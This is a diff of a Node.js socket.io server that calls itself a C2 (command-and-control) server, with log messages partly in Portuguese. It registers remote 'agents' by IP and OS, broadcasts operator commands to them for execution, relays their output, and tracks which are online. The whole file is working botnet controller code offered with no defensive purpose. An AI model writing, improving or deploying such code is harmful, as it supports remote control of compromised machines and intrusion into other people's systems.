@@ -1,6 +1,4 @@
-/* NK HYDRA C2 SERVER v41.0 (STATEFUL) */
-/* SINGULARITY HIVE PROTOCOL */
-
+/* NK C2 SERVER v42.1 - STATEFUL CORE */
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
@@ -8,79 +6,84 @@ const cors = require('cors');
 
 const app = express();
 app.use(cors());
-
-app.get('/', (req, res) => res.send('NK WARLORD C2 v41 - ONLINE'));
+app.get('/', (req, res) => res.json({ 
+    status: 'ONLINE', 
+    agents: Array.from(agentsMap.values()).length 
+}));
 
 const server = http.createServer(app);
 const io = new Server(server, { 
     cors: { origin: "*" },
-    pingTimeout: 60000, 
-    pingInterval: 25000,
-    transports: ['websocket', 'polling'] 
+    pingTimeout: 30000,
+    pingInterval: 10000
 }); 
 
-// STATE MANAGEMENT
-const connectedAgents = new Map();
-
-console.log("[*] SERVIDOR INICIADO. AGUARDANDO EXERCITO...");
+// PERSISTENT STATE
+const agentsMap = new Map();
 
 io.on('connection', (socket) => {
-    // 1. Identify Connection Type
     const clientIp = socket.handshake.address.replace('::ffff:', '');
-    console.log(`[+] NOVA CONEXAO: ${socket.id} (${clientIp})`);
-    
-    // 2. Send current list immediately to the new client (Frontend or Agent)
-    socket.emit('status', { agents: Array.from(connectedAgents.values()) });
+    console.log(`[CONN] NOVA CONEXAO: ${socket.id} (${clientIp})`);
 
-    // 3. Agent Identification Handler
+    // Send current list to anyone who connects (Front or Agents)
+    socket.emit('status', { agents: Array.from(agentsMap.values()) });
+
     socket.on('identify', (data) => {
         if (data.type === 'agent') {
-            const agentId = data.id || socket.id;
-            console.log(`[AGENT CONNECTED] ${agentId}`);
-            
-            const agentData = { 
-                id: agentId, 
-                ip: clientIp, 
-                os: data.os || 'UNKNOWN', 
+            const agentInfo = {
+                id: data.id,
+                ip: clientIp,
+                os: data.os || 'UNKNOWN',
                 status: 'ONLINE',
-                lastSeen: Date.now()
+                lastSeen: Date.now(),
+                socketId: socket.id
             };
             
-            // Store in memory
-            connectedAgents.set(socket.id, agentData);
+            // Update Map
+            agentsMap.set(data.id, agentInfo);
             
-            // Broadcast update to all (Frontend updates UI)
-            io.emit('status', { agents: Array.from(connectedAgents.values()) });
-            io.emit('log', `[SYSTEM] AGENT LINKED: ${agentId}`);
+            console.log(`[+] AGENTE REGISTRADO: ${data.id}`);
+            
+            // Broadcast update to everyone (especially the Dashboard)
+            io.emit('status', { agents: Array.from(agentsMap.values()) });
+            io.emit('log', `[SYSTEM] AGENTE CONECTADO: ${data.id}`);
         }
     });
 
-    // 4. Command Relay
     socket.on('cmd', (data) => {
-        console.log(`[CMD] ${data.cmd} -> ${data.target}`);
+        console.log(`[CMD] REPASSANDO COMANDO: ${data.cmd}`);
+        // Broadcast to ALL sockets (Agents will filter by ID if needed)
         io.emit('exec', data); 
         io.emit('log', `[C2] ORDEM ENVIADA: ${data.cmd}`);
     });
 
-    // 5. Log Relay
     socket.on('stream_log', (data) => {
+        // console.log(`[LOG] ${data.output}`); // Optional: unclutter server logs
         io.emit('log', data);
+        
+        // Update "lastSeen" for the agent sending logs
+        if (data.from && agentsMap.has(data.from)) {
+            const agent = agentsMap.get(data.from);
+            agent.lastSeen = Date.now();
+            agent.status = 'ONLINE';
+            agentsMap.set(data.from, agent);
+            io.emit('status', { agents: Array.from(agentsMap.values()) });
+        }
     });
 
-    // 6. Disconnect Handler
-    socket.on('disconnect', (reason) => {
-        if (connectedAgents.has(socket.id)) {
-            const agent = connectedAgents.get(socket.id);
-            console.log(`[AGENT LOST] ${agent.id} (${reason})`);
-            connectedAgents.delete(socket.id);
-            // Broadcast update
-            io.emit('status', { agents: Array.from(connectedAgents.values()) });
-            io.emit('log', `[SYSTEM] AGENT LOST: ${agent.id}`);
+    socket.on('disconnect', () => {
+        // Find agent by socket ID to mark as offline
+        for (let [id, agent] of agentsMap.entries()) {
+            if (agent.socketId === socket.id) {
+                console.log(`[-] AGENTE PERDIDO: ${id}`);
+                agent.status = 'OFFLINE';
+                agentsMap.set(id, agent);
+                io.emit('status', { agents: Array.from(agentsMap.values()) });
+                break;
+            }
         }
     });
 });
 
-server.listen(process.env.PORT || 3000, () => {
-    console.log(`[*] C2 LISTENING ON PORT ${process.env.PORT || 3000}`);
-});
-    
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => console.log(`[*] C2 OPERACIONAL NA PORTA ${PORT}`));
